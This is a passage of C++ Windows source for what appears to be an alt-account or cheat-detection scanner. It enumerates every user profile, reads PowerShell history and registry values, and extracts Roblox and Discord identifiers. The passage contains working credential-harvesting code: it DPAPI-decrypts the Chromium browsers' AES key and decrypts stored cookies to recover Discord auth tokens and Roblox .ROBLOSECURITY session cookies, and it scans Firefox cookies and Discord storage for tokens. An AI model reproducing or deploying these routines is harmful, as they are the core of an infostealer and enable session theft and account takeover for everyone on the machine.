        std::regex appStorageRx("\"[Uu]ser[Ii][Dd]\"\\s*:\\s*(\\d{4,13})");
        std::regex appStorageGuacRx("GUAC:(\\d{4,13}):");
        std::regex appStorageUrlRx("roblox\\.com/users/(\\d{4,13})");

        auto scanAppStorage = [&](const string& path, const string& label) {
            HANDLE hf = CreateFileA(path.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) return;
            LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
            if (fsz.QuadPart > 0 && fsz.QuadPart <= 2 * 1024 * 1024) {
                string data((size_t)fsz.QuadPart, '\0');
                DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz.QuadPart, &rd, nullptr);
                data.resize(rd);
                size_t before = ids.size();
                for (auto it = std::sregex_iterator(data.begin(), data.end(), appStorageRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                for (auto it = std::sregex_iterator(data.begin(), data.end(), appStorageGuacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                for (auto it = std::sregex_iterator(data.begin(), data.end(), appStorageUrlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                Log("[DBG] AppStorage.json [" + label + "]: " + std::to_string(ids.size() - before) + " new ID(s)");
            }
            CloseHandle(hf);
            };

        WIN32_FIND_DATAA ufdA;
        HANDLE uhA = FindFirstFileA("C:\\Users\\*", &ufdA);
        if (uhA != INVALID_HANDLE_VALUE) {
            do {
                if (!(ufdA.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string uname = ufdA.cFileName;
                if (uname == "." || uname == ".." || uname == "Public" ||
                    uname == "Default" || uname == "Default User") continue;
                string localApp = "C:\\Users\\" + uname + "\\AppData\\Local";

                // Win32 path
                scanAppStorage(localApp + "\\Roblox\\LocalStorage\\AppStorage.json", uname + "@win32");

                // UWP path — glob for ROBLOXCORPORATION.ROBLOX_*
                WIN32_FIND_DATAA pfdA;
                HANDLE phA = FindFirstFileA((localApp + "\\Packages\\ROBLOXCORPORATION.ROBLOX_*").c_str(), &pfdA);
                if (phA != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(pfdA.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                        string pkgPath = localApp + "\\Packages\\" + pfdA.cFileName +
                            "\\LocalState\\LocalStorage\\AppStorage.json";
                        scanAppStorage(pkgPath, uname + "@msstore");
                    } while (FindNextFileA(phA, &pfdA));
                    FindClose(phA);
                }
            } while (FindNextFileA(uhA, &ufdA));
            FindClose(uhA);
        }
    }

    // ── 6. PowerShell history ─────────────────────────────────────────────────
    // Trinity scans PSReadLine\ConsoleHost_history.txt — users running executors
    // or Roblox-related commands from PowerShell leave a trail here even if they
    // think they've deleted everything else. Roblox URLs, executor names typed
    // at a prompt, and cheat-related commands all appear here in plaintext.
    //
    // Path: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    {
        // All Roblox ID patterns + cheat keyword scan in one pass
        std::regex psUrlRx("roblox\\.com/users/(\\d{4,13})");
        std::regex psGuacRx("GUAC:(\\d{4,13}):");
        std::regex psUserIdRx("(?:[Uu]ser[Ii][Dd]|userid)\\D{0,5}(\\d{4,13})");

        WIN32_FIND_DATAA ufdP;
        HANDLE uhP = FindFirstFileA("C:\\Users\\*", &ufdP);
        if (uhP != INVALID_HANDLE_VALUE) {
            do {
                if (!(ufdP.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string uname = ufdP.cFileName;
                if (uname == "." || uname == ".." || uname == "Public" ||
                    uname == "Default" || uname == "Default User") continue;

                string histPath = "C:\\Users\\" + uname +
                    "\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
                HANDLE hf = CreateFileA(histPath.c_str(), GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hf == INVALID_HANDLE_VALUE) continue;

                LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
                if (fsz.QuadPart > 0 && fsz.QuadPart <= 8 * 1024 * 1024) {
                    string data((size_t)fsz.QuadPart, '\0');
                    DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz.QuadPart, &rd, nullptr);
                    data.resize(rd);

                    size_t before = ids.size();
                    for (auto it = std::sregex_iterator(data.begin(), data.end(), psUrlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(data.begin(), data.end(), psGuacRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                    for (auto it = std::sregex_iterator(data.begin(), data.end(), psUserIdRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());

                    Log("[DBG] PSReadLine history [" + uname + "]: " +
                        std::to_string(ids.size() - before) + " new Roblox ID(s), " +
                        std::to_string(std::count(data.begin(), data.end(), '\n')) + " lines");
                }
                CloseHandle(hf);
            } while (FindNextFileA(uhP, &ufdP));
            FindClose(uhP);
        }
    }

    // ── 7. Registry profile URLs ──────────────────────────────────────────────
    // Trinity's get_roblox_profile_urls_from_registry — scans HKCU and HKLM
    // for any value that looks like a Roblox profile URL. This catches launchers,
    // shortcuts, and protocol handlers that store profile links.
    // Pattern: /users/(\d+)/ (Trinity's exact regex)
    {
        std::regex profUrlRx("/users/(\\d{4,13})/");

        auto scanRegForProfileUrls = [&](HKEY root, const char* subkey) {
            HKEY hk;
            if (RegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS) return;
            // Enumerate all values recursively (2 levels deep — same as section 4)
            char vName[16384]; DWORD vLen; BYTE vData[65536]; DWORD dLen, type;
            DWORD idx = 0;
            while (true) {
                vLen = sizeof(vName); dLen = sizeof(vData);
                if (RegEnumValueA(hk, idx++, vName, &vLen, nullptr, &type, vData, &dLen) != ERROR_SUCCESS) break;
                if (type == REG_SZ || type == REG_EXPAND_SZ || type == REG_MULTI_SZ) {
                    string val((char*)vData);
                    for (auto it = std::sregex_iterator(val.begin(), val.end(), profUrlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                }
            }
            DWORD kidx = 0; char subName[512]; DWORD subLen;
            while (true) {
                subLen = sizeof(subName);
                if (RegEnumKeyExA(hk, kidx++, subName, &subLen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
                HKEY hSub;
                if (RegOpenKeyExA(hk, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
                    DWORD sidx = 0;
                    while (true) {
                        vLen = sizeof(vName); dLen = sizeof(vData);
                        if (RegEnumValueA(hSub, sidx++, vName, &vLen, nullptr, &type, vData, &dLen) != ERROR_SUCCESS) break;
                        if (type == REG_SZ || type == REG_EXPAND_SZ || type == REG_MULTI_SZ) {
                            string val((char*)vData);
                            for (auto it = std::sregex_iterator(val.begin(), val.end(), profUrlRx); it != std::sregex_iterator(); ++it) addId((*it)[1].str());
                        }
                    }
                    RegCloseKey(hSub);
                }
            }
            RegCloseKey(hk);
            };

        // HKCU — per-user: protocol handlers, MRU lists, UserAssist
        scanRegForProfileUrls(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\ProtocolExecute");
        scanRegForProfileUrls(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU");
        scanRegForProfileUrls(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs");
        scanRegForProfileUrls(HKEY_CURRENT_USER, "Software\\Roblox");
        // HKLM — system-wide Roblox installs and protocol handlers
        scanRegForProfileUrls(HKEY_LOCAL_MACHINE, "SOFTWARE\\Roblox");
        scanRegForProfileUrls(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Roblox");
        scanRegForProfileUrls(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Internet Explorer\\ProtocolExecute");
        Log("[DBG] Registry profile URL scan complete, IDs so far: " + std::to_string(ids.size()));
    }

    return ids;
}

// Mirrors Trinity's get_discord_accounts_from_storage.
// Trinity reads renderer_js.log for MultiAccountActionCreators switch events
// which records every account that has ever been switched to — not just the
// current one. Combined with LevelDB token scanning this gives full history.

// =========================================================================
//  Browser Cookie scanning  (Chrome AES-GCM decryption + Firefox plaintext)
// =========================================================================

// Reads Chrome/Edge/Brave's "Local State" file from the given browser user-data
// base directory, base64-decodes the "encrypted_key" field, and DPAPI-decrypts
// it to yield the 32-byte AES-256 key used for v10/v11 cookie encryption.
// Returns an empty vector on any failure (wrong user context, missing file, etc.)
static vector<BYTE> GetChromeAesKey(const string& userDataBase) {
    string lsPath = userDataBase + "\\Local State";
    HANDLE hf = CreateFileA(lsPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return {};
    LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
    if (fsz.QuadPart <= 0 || fsz.QuadPart > 5 * 1024 * 1024) { CloseHandle(hf); return {}; }
    string data((size_t)fsz.QuadPart, '\0');
    DWORD rd = 0; ReadFile(hf, &data[0], (DWORD)fsz.QuadPart, &rd, nullptr); CloseHandle(hf);
    data.resize(rd);

    // Extract encrypted_key value from JSON
    static const std::regex keyRx("\"encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]{20,})\"");
    std::smatch m;
    if (!std::regex_search(data, m, keyRx)) return {};

    // Base64 decode
    string b64 = m[1].str();
    DWORD outLen = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
        CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr) || outLen < 5) return {};
    vector<BYTE> encKey(outLen);
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
        CRYPT_STRING_BASE64, encKey.data(), &outLen, nullptr, nullptr)) return {};
    encKey.resize(outLen);

    // Strip the 5-byte "DPAPI" magic prefix Chrome prepends before encrypting
    if (encKey.size() < 5 ||
        encKey[0] != 'D' || encKey[1] != 'P' || encKey[2] != 'A' ||
        encKey[3] != 'P' || encKey[4] != 'I') return {};

    DATA_BLOB inBlob = { (DWORD)(encKey.size() - 5), encKey.data() + 5 };
    DATA_BLOB outBlob = {};
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) return {};
    vector<BYTE> aesKey(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return aesKey;
}

// Decrypts a Chrome v10/v11 AES-256-GCM encrypted cookie blob using BCrypt.
// Format: "v10"|"v11" (3 bytes) + nonce (12 bytes) + ciphertext + GCM tag (16 bytes)
// Returns the decrypted plaintext string, or "" on failure.
static string DecryptChromeCookie(const vector<BYTE>& raw, size_t offset, size_t blobLen,
    const vector<BYTE>& aesKey) {
    // blobLen = total bytes starting at offset (includes v10/v11 + nonce + cipher + tag)
    if (blobLen < 3 + 12 + 1 + 16) return "";
    if (offset + blobLen > raw.size()) return "";
    if (raw[offset] != 'v' || raw[offset + 1] != '1' ||
        (raw[offset + 2] != '0' && raw[offset + 2] != '1')) return "";

    const BYTE* nonce = raw.data() + offset + 3;
    const BYTE* ciphertext = raw.data() + offset + 3 + 12;
    ULONG cipherLen = (ULONG)(blobLen - 3 - 12 - 16);
    const BYTE* tag = raw.data() + offset + blobLen - 16;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return "";

    // Set GCM chaining mode
    const wchar_t* gcmMode = BCRYPT_CHAIN_MODE_GCM;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)gcmMode, (ULONG)((wcslen(gcmMode) + 1) * sizeof(wchar_t)), 0);

    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS st = BCryptGenerateSymmetricKey(hAlg, &hKey,
        nullptr, 0, (PUCHAR)aesKey.data(), (ULONG)aesKey.size(), 0);
    if (!BCRYPT_SUCCESS(st)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {};
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;   authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;     authInfo.cbTag = 16;

    vector<BYTE> plain(cipherLen);
    ULONG plainLen = cipherLen;
    st = BCryptDecrypt(hKey, (PUCHAR)ciphertext, cipherLen,
        &authInfo, nullptr, 0, plain.data(), plainLen, &plainLen, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return "";
    plain.resize(plainLen);
    return string(plain.begin(), plain.end());
}

// Result from scanning one cookie file.
struct CookieScanResult {
    vector<string> discordAccounts; // formatted strings with ID + source label
    vector<string> robloxNotes;     // human-readable notes about Roblox sessions
};

// Searches raw bytes for the byte sequence `needle`.
static size_t FindBytes(const vector<BYTE>& haystack, size_t start,
    const char* needle, size_t needleLen) {
    if (start + needleLen > haystack.size()) return string::npos;
    for (size_t i = start; i + needleLen <= haystack.size(); ++i) {
        if (memcmp(haystack.data() + i, needle, needleLen) == 0) return i;
    }
    return string::npos;
}

// Scans one browser cookie SQLite file for Discord tokens and Roblox cookies.
// aesKey: non-empty = Chrome-style AES-GCM decryption; empty = plaintext scan only.
// label:  source description appended to output strings (e.g. "chrome@Username").
static CookieScanResult ScanCookieFile(const string& cookiePath,
    const vector<BYTE>& aesKey,
    const string& label) {
    CookieScanResult res;

    // Copy to a temp file to avoid lock conflicts when browser is running.
    char tmpDir[MAX_PATH] = {}; GetTempPathA(MAX_PATH, tmpDir);
    string tmpPath = string(tmpDir) + "hbc_ck_tmp_" + std::to_string(GetCurrentThreadId());
    CopyFileA(cookiePath.c_str(), tmpPath.c_str(), FALSE);

    HANDLE hf = CreateFileA(tmpPath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(tmpPath.c_str()); return res; }
    LARGE_INTEGER fsz = {}; GetFileSizeEx(hf, &fsz);
    if (fsz.QuadPart <= 0 || fsz.QuadPart > 50LL * 1024 * 1024) {
        CloseHandle(hf); DeleteFileA(tmpPath.c_str()); return res;
    }
    vector<BYTE> raw((size_t)fsz.QuadPart);
    DWORD rd = 0; ReadFile(hf, raw.data(), (DWORD)fsz.QuadPart, &rd, nullptr);
    CloseHandle(hf); DeleteFileA(tmpPath.c_str());
    raw.resize(rd);

    // ── Patterns we search for as raw byte sequences ──────────────────────────
    // These are the cookie *name* strings stored as plaintext in SQLite even
    // when the cookie *value* is encrypted.
    // After finding the name, we scan forward for a v10/v11 encrypted blob
    // (Chrome) or a plaintext value (Firefox / old Chrome).

    static const struct { const char* name; bool isDiscord; bool isRoblox; } TARGETS[] = {
        { "token",             true,  false },  // Discord web token cookie
        { ".ROBLOSECURITY",    false, true  },  // Roblox auth cookie
        { "GuestData",         false, true  },  // Roblox guest / anon cookie (presence indicator)
    };

    // Regex for validating decrypted Discord token
    static const std::regex discordTokRx(
        "^(mfa\\.[A-Za-z0-9_\\-]{20,}"
        "|[A-Za-z0-9_\\-]{23,28}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,})$"
    );

    std::set<string> seenDiscordIds;
    bool robloxNoted = false;

    for (auto& tgt : TARGETS) {
        size_t nameLen = strlen(tgt.name);
        size_t pos = 0;
        while (true) {
            pos = FindBytes(raw, pos, tgt.name, nameLen);
            if (pos == string::npos) break;
            pos += nameLen;

            // Scan up to 2 KB ahead for v10/v11 (encrypted) or a text value
            size_t searchEnd = std::min(pos + 2048, raw.size());

            // ── Chrome encrypted blob ───────────────────────────────────────
            if (!aesKey.empty()) {
                size_t blobStart = string::npos;
                for (size_t k = pos; k + 3 <= searchEnd; ++k) {
                    if (raw[k] == 'v' && raw[k + 1] == '1' &&
                        (raw[k + 2] == '0' || raw[k + 2] == '1')) {
                        blobStart = k; break;
                    }
                }
                if (blobStart != string::npos) {
                    // Try blob sizes covering Discord tokens (59-100 bytes of cipher)
                    // and Roblox .ROBLOSECURITY (200-600 bytes of cipher).
                    // 3(prefix) + 12(nonce) + cipherLen + 16(tag)
                    static const size_t SIZES[] = {
                        // Discord range
                        91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
                        101,102,103,104,105,106,107,108,109,110,
                        111,115,120,125,130,
                        // Roblox range
                        200,210,220,230,240,250,260,270,280,290,
                        300,320,340,360,380,400,420,440,460,480,
                        500,520,540,560,580,600,650,700,750,800,
                    };
                    for (size_t blobLen : SIZES) {
                        if (blobStart + blobLen > raw.size()) break;
                        string dec = DecryptChromeCookie(raw, blobStart, blobLen, aesKey);
                        if (dec.empty()) continue;

                        if (tgt.isDiscord) {
                            // Validate as Discord token
                            string decTrim = dec;
                            while (!decTrim.empty() && (unsigned char)decTrim.back() < 0x20)
                                decTrim.pop_back();
                            if (std::regex_match(decTrim, discordTokRx)) {
                                string uid = DecodeDiscordTokenUserId(decTrim);
                                if (!uid.empty() && seenDiscordIds.insert(uid).second) {
                                    // Try to resolve username
                                    string entry = "Discord ID: " + uid;
                                    res.discordAccounts.push_back(entry +
                                        "  [cookie@" + label + "]");
                                }
                                else if (uid.empty() &&
                                    decTrim.substr(0, 4) == "mfa.") {
                                    res.discordAccounts.push_back(
                                        "Discord: MFA account (cookie token)  [cookie@" + label + "]");
                                }
                                break; // found the right size
                            }
                        }
                        else if (tgt.isRoblox) {
                            // Validate as Roblox cookie
                            if (dec.substr(0, 9) == "_|WARNING" && !robloxNoted) {
                                res.robloxNotes.push_back(
                                    "Roblox .ROBLOSECURITY session cookie found  [cookie@" + label + "]");
                                robloxNoted = true;
                                break;
                            }
                        }
                    }
                }
            }

            // ── Plaintext value scan (Firefox / old Chrome / unencrypted) ──
            // After the cookie name in a Firefox SQLite file the value is stored
            // as raw UTF-8 text. Scan the next 2 KB for known value patterns.
            {
                // Build a text window (null→space for regex safety)
                size_t wEnd = std::min(pos + 2048, raw.size());
                string window(raw.begin() + pos, raw.begin() + wEnd);
                for (char& c : window) if (c == '\0') c = ' ';

                if (tgt.isDiscord) {
                    // Look for a bare Discord token in plaintext
                    static const std::regex ptTokRx(
                        "(mfa\\.[A-Za-z0-9_\\-]{20,}"
                        "|[A-Za-z0-9_\\-]{23,28}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,})"
                    );
                    for (auto it = std::sregex_iterator(window.begin(), window.end(), ptTokRx);
                        it != std::sregex_iterator(); ++it) {
                        string tok = (*it)[1].str();
                        string uid = DecodeDiscordTokenUserId(tok);
                        if (!uid.empty() && seenDiscordIds.insert(uid).second) {
                            res.discordAccounts.push_back(
                                "Discord ID: " + uid + "  [cookie-plaintext@" + label + "]");
                        }
                        else if (uid.empty() && tok.substr(0, 4) == "mfa.") {
                            res.discordAccounts.push_back(
                                "Discord: MFA account (plaintext cookie)  [cookie-plaintext@" + label + "]");
                        }
                    }
                }
                else if (tgt.isRoblox) {
                    if (window.find("_|WARNING") != string::npos && !robloxNoted) {
                        res.robloxNotes.push_back(
                            "Roblox .ROBLOSECURITY session cookie found  [cookie-plaintext@" + label + "]");
                        robloxNoted = true;
                    }
                }
            }
        } // while (scanning for cookie name)
    } // for each target cookie name

    return res;
}

// Returns the cookie file path for a given browser profile directory.
// Chrome 96+ moved cookies to Network\Cookies; older builds use just Cookies.
static string FindCookieFile(const string& profileDir) {
    string net = profileDir + "\\Network\\Cookies";
    if (GetFileAttributesA(net.c_str()) != INVALID_FILE_ATTRIBUTES) return net;
    string plain = profileDir + "\\Cookies";
    if (GetFileAttributesA(plain.c_str()) != INVALID_FILE_ATTRIBUTES) return plain;
    return "";
}

// Scans all Chromium browser profiles + Firefox for Discord and Roblox cookie accounts.
// Populates discordOut and robloxOut with human-readable result strings.
static void ScanAllBrowserCookies(vector<string>& discordOut, vector<string>& robloxOut) {
    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh == INVALID_HANDLE_VALUE) return;
    do {
        if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        string uname = ufd.cFileName;
        if (uname == "." || uname == ".." || uname == "Public" ||
            uname == "Default" || uname == "Default User") continue;
        string local = "C:\\Users\\" + uname + "\\AppData\\Local";
        string roaming = "C:\\Users\\" + uname + "\\AppData\\Roaming";

        // ── Chromium-based browsers ───────────────────────────────────────────
        struct BrowserDef { string base; string label; };
        vector<BrowserDef> browsers = {
            { local + "\\Google\\Chrome\\User Data",              "chrome@" + uname },
            { local + "\\Microsoft\\Edge\\User Data",             "edge@" + uname },
            { local + "\\BraveSoftware\\Brave-Browser\\User Data","brave@" + uname },
            { local + "\\Vivaldi\\User Data",                     "vivaldi@" + uname },
            { roaming + "\\Opera Software\\Opera Stable",           "opera@" + uname },
        };

        for (auto& br : browsers) {
            DWORD ba = GetFileAttributesA(br.base.c_str());
            if (ba == INVALID_FILE_ATTRIBUTES || !(ba & FILE_ATTRIBUTE_DIRECTORY)) continue;

            // Get the AES decryption key for this browser (from Local State)
            vector<BYTE> aesKey = GetChromeAesKey(br.base);

            // Iterate profiles (Default, Profile 1, Profile 2, …)
            WIN32_FIND_DATAA pfd;
            HANDLE ph = FindFirstFileA((br.base + "\\*").c_str(), &pfd);
            if (ph == INVALID_HANDLE_VALUE) continue;
            do {
                if (!(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string pnLow = Lower(string(pfd.cFileName));
                if (pnLow == "." || pnLow == "..") continue;
                if (pnLow != "default" && pnLow.find("profile") != 0) continue;

                string profileDir = br.base + "\\" + pfd.cFileName;
                string cookiePath = FindCookieFile(profileDir);
                if (cookiePath.empty()) continue;

                string profileLabel = br.label;
                if (pnLow != "default") profileLabel += "/" + string(pfd.cFileName);

                CookieScanResult cr = ScanCookieFile(cookiePath, aesKey, profileLabel);
                for (auto& s : cr.discordAccounts) discordOut.push_back(s);
                for (auto& s : cr.robloxNotes)     robloxOut.push_back(s);

            } while (FindNextFileA(ph, &pfd));
            FindClose(ph);
        }

        // ── Firefox ───────────────────────────────────────────────────────────
        // Firefox stores cookies in plaintext SQLite; no decryption key needed.
        string ffBase = roaming + "\\Mozilla\\Firefox\\Profiles";
        WIN32_FIND_DATAA ffd;
        HANDLE ffh = FindFirstFileA((ffBase + "\\*").c_str(), &ffd);
        if (ffh != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string pnLow = Lower(string(ffd.cFileName));
                if (pnLow == "." || pnLow == "..") continue;
                string ckPath = ffBase + "\\" + ffd.cFileName + "\\cookies.sqlite";
                if (GetFileAttributesA(ckPath.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
                string label = "firefox@" + uname + "/" + string(ffd.cFileName);
                CookieScanResult cr = ScanCookieFile(ckPath, {}, label); // empty key = plaintext
                for (auto& s : cr.discordAccounts) discordOut.push_back(s);
                for (auto& s : cr.robloxNotes)     robloxOut.push_back(s);
            } while (FindNextFileA(ffh, &ffd));
            FindClose(ffh);
        }

    } while (FindNextFileA(uh, &ufd));
    FindClose(uh);
}

static vector<string> TrinityGetDiscordAccounts() {
    // Sources scanned (in priority order):
    //
    //   1. renderer_js.log / renderer_js.old.log
    //      Scanned LINE BY LINE for any line containing a Discord snowflake
    //      near "MultiAccount", "Switching account", or "LOGIN_SUCCESS".
    //      Previous approach used a single multi-part regex with .*? across
    //      the whole file — broken because std::regex '.' does not cross
    //      newlines, so multi-line log entries never matched even though
    //      10 MB of log was read.  Line-by-line fixes this entirely.
    //
    //   2. Local Storage\leveldb — proper LevelDB parsing
    //      Uses ParseLevelDbLog (WAL) and ParseLevelDbSst (SSTable) to extract
    //      clean key+value strings BEFORE running regex.  This survives
    //      compaction: when Discord's LevelDB compacts .log -> .ldb the raw
    //      null-replace approach loses data because SSTable blocks use shared-
    //      prefix compression, but the parser handles that correctly.
    //      Within each extracted string we run id+username+token patterns.
    //      Token in same record  -> confirmed logged-in account.
    //      Ownership context kw  -> high-confidence account.
    //      username in same record within 2000 bytes -> medium confidence.
    //      Raw fallback also runs on each file for belt-and-suspenders.
    //
    // Variants: discord, discordptb, discordcanary, vesktop

    vector<string> accounts;

    struct DiscordUser { string username; string gname; string lastSeen; };
    std::map<string, DiscordUser> idToUser;
    std::map<string, string> rendererTs; // uid -> best timestamp from renderer_js

    const vector<string> variants = { "discord", "discordptb", "discordcanary", "vesktop" };

    std::regex idRx("\"id\"\\s*:\\s*\"(\\d{17,19})\"");
    std::regex userRx("\"username\"\\s*:\\s*\"([^\"\\\\]{1,50})\"");
    std::regex gnameRx("\"global_name\"\\s*:\\s*\"([^\"\\\\]{1,64})\"");
    std::regex snowflakeRx("\\b(\\d{17,19})\\b");
    std::regex tokenRx(
        "(mfa\\.[A-Za-z0-9_\\-]{20,}"
        "|[A-Za-z0-9_\\-]{23,28}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,})"
    );
    // "lastSwitched": 1741709841763  — Discord account-switcher ms timestamp
    std::regex lastSwitchedRx("\"lastSwitched\"\\s*:\\s*(\\d{12,14})");

    static const vector<string> ownerCtx = {
        "\"token\"", "\"currentuser\"", "\"current_user\"", "account_manager",
        "\"accounts\"", "\"analyticstoken\"", "\"sessionid\"", "\"session_id\""
    };

    // ── Helper: record a confirmed or proximity-matched account ──────────────
    auto record = [&](const string& uid, const string& uname, const string& gname,
        const string& label, bool confirmed) {
            if (uid.empty()) return;
            bool isNew = (idToUser.find(uid) == idToUser.end());
            if (isNew) idToUser[uid] = {};
            if (!uname.empty()) {
                idToUser[uid].username = uname;
                Log("[DBG]   username \"" + uname + "\" -> id " + uid +
                    (confirmed ? " [confirmed]" : " [proximity]") + "  [" + label + "]");
            }
            else if (confirmed || isNew) {
                Log("[DBG]   id " + uid + (confirmed ? " [confirmed]" : " [bare]") +
                    "  [" + label + "]");
            }
            if (!gname.empty()) idToUser[uid].gname = gname;
        };

    // ── Helper: scan one extracted string for id+user+token combos ───────────
    auto processString = [&](const string& s, const string& label) {
        if (s.size() < 10) return;
        struct PV { size_t pos; string val; };
        vector<PV> ids, users, gnames, tokens;
        for (auto it = std::sregex_iterator(s.begin(), s.end(), idRx);
            it != std::sregex_iterator(); ++it)
            ids.push_back({ (size_t)it->position(), (*it)[1].str() });
        if (ids.empty()) return;
        for (auto it = std::sregex_iterator(s.begin(), s.end(), userRx);
            it != std::sregex_iterator(); ++it)
            users.push_back({ (size_t)it->position(), (*it)[1].str() });
        for (auto it = std::sregex_iterator(s.begin(), s.end(), gnameRx);
            it != std::sregex_iterator(); ++it)
            gnames.push_back({ (size_t)it->position(), (*it)[1].str() });
        for (auto it = std::sregex_iterator(s.begin(), s.end(), tokenRx);
            it != std::sregex_iterator(); ++it)
            tokens.push_back({ (size_t)it->position(), (*it)[1].str() });

        // Extract lastSwitched timestamps (ms since epoch)
        struct PVL { size_t pos; long long ms; };
        vector<PVL> lsTs;
        for (auto it = std::sregex_iterator(s.begin(), s.end(), lastSwitchedRx);
            it != std::sregex_iterator(); ++it) {
            try { lsTs.push_back({ (size_t)it->position(), std::stoll((*it)[1].str()) }); }
            catch (...) {}
        }

        bool hasToken = !tokens.empty();
        string sLow = Lower(s);
        bool hasCtx = false;
        for (auto& ctx : ownerCtx)
            if (sLow.find(ctx) != string::npos) { hasCtx = true; break; }

        for (auto& id : ids) {
            string bestUser, bestGname;
            size_t bestUD = SIZE_MAX, bestGD = SIZE_MAX;
            for (auto& u : users) {
                size_t d = (u.pos > id.pos) ? u.pos - id.pos : id.pos - u.pos;
                if (d < bestUD) { bestUD = d; bestUser = u.val; }
            }
            for (auto& g : gnames) {
                size_t d = (g.pos > id.pos) ? g.pos - id.pos : id.pos - g.pos;
                if (d < bestGD) { bestGD = d; bestGname = g.val; }
            }
            if (hasToken) {
                record(id.val, bestUser, bestGname, label, true);
            }
            else if (hasCtx) {
                record(id.val, bestUser, bestGname, label, true);
            }
            else if (!bestUser.empty() && bestUD <= 2000) {
                record(id.val, bestUser, bestGname, label, false);
            }
            // Bare snowflake with no token/context/username — skip.
            // LevelDB and IndexedDB contain snowflakes for every guild member,
            // message author, channel, and role ever rendered. Recording them
            // all produces thousands of false-positive "accounts".

            // For any recorded account, find the closest lastSwitched timestamp
            // in this string and set lastSeen if it gives a newer value.
            if (idToUser.find(id.val) != idToUser.end() && !lsTs.empty()) {
                size_t bestLD = SIZE_MAX; long long bestMs = 0;
                for (auto& lt : lsTs) {
                    size_t d = (lt.pos > id.pos) ? lt.pos - id.pos : id.pos - lt.pos;
                    if (d < bestLD) { bestLD = d; bestMs = lt.ms; }
                }
                if (bestLD <= 4000 && bestMs > 0) {
                    // Convert ms -> "YYYY-MM-DD HH:MM:SS"
                    time_t t = (time_t)(bestMs / 1000);
                    struct tm tmi; gmtime_s(&tmi, &t);
